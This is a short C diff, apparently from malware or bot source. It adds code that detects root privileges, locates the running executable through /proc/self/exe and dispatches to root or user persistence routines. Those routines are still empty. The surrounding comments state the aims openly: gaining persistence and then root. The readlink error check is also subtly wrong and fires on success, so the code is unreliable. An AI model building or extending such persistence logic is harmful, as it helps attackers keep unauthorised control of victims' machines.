@@ -7,6 +7,9 @@
 #include "lsocket.h"
 #include "lerror.h"
 
+#include <unistd.h>
+#include <sys/types.h>
+
 static struct sLaika_socket laikaB_markerPort;
 
 /* check if laika is already running */
@@ -21,7 +24,7 @@ bool laikaB_checkPersist() {
 
 /* check if laika is running as super-user */
 bool laikaB_checkRoot() {
-    return true; /* stubbed for now */
+    return geteuid() == 0; /* user id 0 is reserved for root in 99% of the cases */
 }
 
 /* mark that laika is currently running */
@@ -44,9 +47,35 @@ void laikaB_unmarkRunning() {
 #endif
 }
 
+void getCurrentExe(char *outPath, int pathSz) {
+    int sz;
+
+    /* thanks linux :D */
+    if ((sz = readlink("/proc/self/exe", outPath, pathSz - 1)) != 0)
+        LAIKA_ERROR("Failed to grab current process executable path!\n");
+
+    outPath[sz] = '\0';
+}
+
+void tryPersistUser(char *path) {
+
+}
+
+void tryPersistRoot(char *path) {
+
+}
+
 /* try to gain persistance on machine */
 void laikaB_tryPersist() {
-    /* stubbed */
+    char exePath[PATH_MAX];
+
+    /* grab current process's executable & try to gain persistance */
+    getCurrentExe(exePath, PATH_MAX);
+    if (laikaB_checkRoot()) {
+        tryPersistRoot(exePath);
+    } else {
+        tryPersistUser(exePath);
+    }
 }
 
 /* try to gain root */
